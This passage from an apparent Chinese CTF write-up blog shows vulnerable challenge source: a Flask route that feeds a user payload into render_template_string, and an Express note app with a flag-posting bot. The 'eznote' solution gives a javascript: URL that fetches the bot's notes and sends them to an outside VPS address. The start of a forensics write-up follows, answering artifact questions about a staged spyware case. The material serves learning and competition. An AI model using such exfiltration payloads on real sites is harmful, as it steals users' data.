class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> payload:</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;&#x27;_#&amp;;&quot;</span>:</span><br><span class="line">                    abort(<span class="number">403</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都是密码题，赫赫，不看了。</p><h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p>一眼xss</p><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; randomBytes &#125; = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; visit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./bot&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> createDOMPurify = <span class="built_in">require</span>(<span class="string">&#x27;dompurify&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">JSDOM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;jsdom&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="keyword">new</span> <span class="title function_">JSDOM</span>(<span class="string">&#x27;&#x27;</span>).<span class="property">window</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LISTEN_PORT</span> = <span class="number">3000</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LISTEN_HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;html&#x27;</span>)</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">renderFile</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomBytes</span>(<span class="number">4</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">notes</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">notes</span> = []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> notes = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123; notes.<span class="title function_">clear</span>() &#125;, <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toHtml</span>(<span class="params">source, format</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (format == <span class="literal">undefined</span>) &#123;</span><br><span class="line">        format = <span class="string">&#x27;markdown&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> tmpfile = path.<span class="title function_">join</span>(<span class="string">&#x27;notes&#x27;</span>, <span class="title function_">randomBytes</span>(<span class="number">4</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(tmpfile, source)</span><br><span class="line">    <span class="keyword">let</span> res = spawn.<span class="title function_">execSync</span>(<span class="string">`pandoc -f <span class="subst">$&#123;format&#125;</span> <span class="subst">$&#123;tmpfile&#125;</span>`</span>).<span class="title function_">toString</span>()</span><br><span class="line">    <span class="comment">// fs.unlinkSync(tmpfile)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ping&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;pong&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">notes</span>: req.<span class="property">session</span>.<span class="property">notes</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/notes&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(req.<span class="property">session</span>.<span class="property">notes</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; noteId &#125; = req.<span class="property">params</span></span><br><span class="line">    <span class="keyword">if</span>(!notes.<span class="title function_">has</span>(noteId))&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;no such note&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">let</span> note = notes.<span class="title function_">get</span>(noteId)</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, note)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/note&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> noteId = <span class="title function_">randomBytes</span>(<span class="number">8</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> &#123; title, content, format &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9a-zA-Z]&#123;1,10&#125;$/</span>.<span class="title function_">test</span>(format)) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;illegal format!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    notes.<span class="title function_">set</span>(noteId, &#123;</span><br><span class="line">        <span class="attr">title</span>: title,</span><br><span class="line">        <span class="attr">content</span>: <span class="title function_">toHtml</span>(content, format)</span><br><span class="line">    &#125;)</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">notes</span>.<span class="title function_">push</span>(noteId)</span><br><span class="line">    res.<span class="title function_">send</span>(noteId)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;report&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; url &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">visit</span>(url)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">LISTEN_PORT</span>, <span class="variable constant_">LISTEN_HOST</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening on <span class="subst">$&#123;LISTEN_HOST&#125;</span>:<span class="subst">$&#123;LISTEN_PORT&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bot.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> flag = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(<span class="string">&#x27;flag.txt&#x27;</span>))&#123;</span><br><span class="line">        flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line">        fs.<span class="title function_">unlinkSync</span>(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HEADLESS</span> = !!(process.<span class="property">env</span>.<span class="property">PROD</span> ?? <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">sec</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, sec * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="variable constant_">HEADLESS</span>,</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">&#x27;/usr/bin/chromium&#x27;</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>],</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">let</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://localhost:3000/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&#x27;#title&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#title&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, &#123;<span class="attr">delay</span>: <span class="number">100</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#content&#x27;</span>, <span class="variable constant_">FLAG</span>, &#123;<span class="attr">delay</span>: <span class="number">100</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#submit&#x27;</span>, &#123;<span class="attr">delay</span>: <span class="number">100</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;visiting %s&#x27;</span>, url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url)</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    visit</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到bot.js，它在visit时会先访问自身的3000端口，其实也就是上传note的界面，他会将自己的flag填入并上传，那么此时，我们是不是只需要获取bot上传的noteid即可呢！！！因为我们的&#x2F;note&#x2F;noteid是从notes中获取数据的！</p><p>那么我们接下来要思考的就是如何获取bot上传的noteid。</p><p>我们让bot去访问&#x2F;notes路由再带着回显访问我们的vps？！</p><p>用到javascript伪协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:fetch(&quot;http://localhost:3000/notes&quot;).then(r=&gt;r.text()).then(d=&gt;&#123;new Image().src=&quot;http://156.238.233.113:4567/?data=&quot;+encodeURIComponent(d)&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025平航杯 wp</title>
      <link href="/2025/04/28/2025%E5%B9%B3%E8%88%AA%E6%9D%AF-wp/"/>
      <url>/2025/04/28/2025%E5%B9%B3%E8%88%AA%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<p>任务书：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2025年4月，杭州滨江警方接到辖区内市民刘晓倩(简称：倩倩)报案称：其个人电子设备疑似遭人监控。经初步调查，警方发现倩倩的手机存在可疑后台活动，手机可能存在被木马控制情况；对倩倩计算机进行流量监控，捕获可疑流量包。遂启动电子数据取证程序。</span><br><span class="line"></span><br><span class="line">警方通过对倩倩手机和恶意流量包的分析，锁定一名化名“起早王”的本地男子。经搜查其住所，警方查扣一台个人电脑和服务器。技术分析显示，该服务器中存有与倩倩设备内同源的特制远控木马，可实时窃取手机摄像头、手机通信记录等相关敏感文件。进一步对服务器溯源，发现“起早王”曾渗透其任职的科技公司购物网站，获得公司服务器权限，非法窃取商业数据并使用公司的服务器搭建Trojan服务并作为跳板机实施远控。</span><br><span class="line">请你结合以上案例并根据相关检材，完成下面的勘验工作。</span><br><span class="line"></span><br><span class="line">容器密码：早起王的爱恋日记❤</span><br></pre></td></tr></table></figure><h2 id="计算机部分"><a href="#计算机部分" class="headerlink" title="计算机部分"></a>计算机部分</h2><h3 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h3><blockquote><p>分析起早王的计算机检材，起早王的计算机插入过usb序列号是什么(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422152918878.png" alt="image-20250422152918878"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F25550031111202</span><br></pre></td></tr></table></figure><h3 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h3><blockquote><p>分析起早王的计算机检材，起早王的便签里有几条待干(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422160438134.png" alt="image-20250422160438134"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h3><blockquote><p>分析起早王的计算机检材，起早王的计算机默认浏览器是什么(格式：Google)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422160611660.png" alt="image-20250422160611660"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Edge</span><br></pre></td></tr></table></figure><h3 id="T4"><a href="#T4" class="headerlink" title="T4"></a>T4</h3><blockquote><p>分析起早王的计算机检材，起早王在浏览器里看过什么小说(格式：十日终焉)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422160809768.png" alt="image-20250422160809768"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">道诡异仙</span><br></pre></td></tr></table></figure><h3 id="T5"><a href="#T5" class="headerlink" title="T5"></a>T5</h3><blockquote><p>分析起早王的计算机检材，起早王计算机最后一次正常关机时间(格式：2020&#x2F;1&#x2F;1 01:01:01)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422160936419.png" alt="image-20250422160936419"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025-04-10 11:15:29</span><br></pre></td></tr></table></figure><h3 id="T6"><a href="#T6" class="headerlink" title="T6"></a>T6</h3><blockquote><p>分析起早王的计算机检材，起早王开始写日记的时间(格式：2020&#x2F;1&#x2F;1)</p></blockquote><p>我们打开桌面上的<code>sandbox</code>，发现存在一个diary，猜测就是日记。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422181601816.png" alt="image-20250422181601816"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422181801063.png" alt="image-20250422181801063"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/3/3</span><br></pre></td></tr></table></figure><h3 id="T7"><a href="#T7" class="headerlink" title="T7"></a>T7</h3><blockquote><p>分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候(格式：2020&#x2F;1&#x2F;1 01:01:01) </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422182104424.png" alt="image-20250422182104424"></p><p>不出意外是与这个wife文件夹相关的，那么我们打开看看。</p><p>发现其中的start.bat，我们直接打开</p><p>密码可以在日记中获得。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422182554976.png" alt="image-20250422182554976"></p><p>输入后成功登陆了这个网站。直接获得了bitlocker的密码，我们先解密了，再看这道题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 